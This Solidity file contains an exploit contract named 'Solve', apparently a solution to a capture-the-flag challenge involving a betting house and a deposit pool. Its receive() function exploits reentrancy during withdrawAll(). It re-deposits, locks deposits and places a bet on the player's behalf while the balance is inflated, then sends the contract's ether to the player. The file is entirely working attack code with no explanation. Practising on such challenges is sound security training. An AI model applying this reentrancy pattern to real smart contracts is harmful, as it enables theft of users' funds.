// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IBetHouse {
    function pool() external returns (address);
    function makeBet(address) external;
}

interface IPool {
    function depositToken() external returns (address);
    function deposit(uint256) external payable;
    function withdrawAll() external;
    function lockDeposits() external;
}

interface IPoolToken {
    function approve(address, uint256) external;
    function transfer(address, uint256) external;
}

contract Solve {
    address player;
    address betHouseAddr;
    address poolAddr;
    address depositTokenAddr;

    constructor(address _betHouseAddr, address _poolAddr, address _depositTokenAddr, address _player) {
        betHouseAddr = _betHouseAddr;
        poolAddr = _poolAddr;
        depositTokenAddr = _depositTokenAddr;
        player = _player;
    }

    function attack() public payable {
        IPoolToken(depositTokenAddr).approve(poolAddr, type(uint256).max);

        IPool(poolAddr).deposit{value: 0.001 ether}(5);
        IPool(poolAddr).withdrawAll();
    }

    receive() external payable {
        IPoolToken(depositTokenAddr).approve(poolAddr, type(uint256).max);

        IPool(poolAddr).deposit(5);

        IPool(poolAddr).lockDeposits();

        IBetHouse(betHouseAddr).makeBet(player);

        player.call{value: address(this).balance}("");
    }
}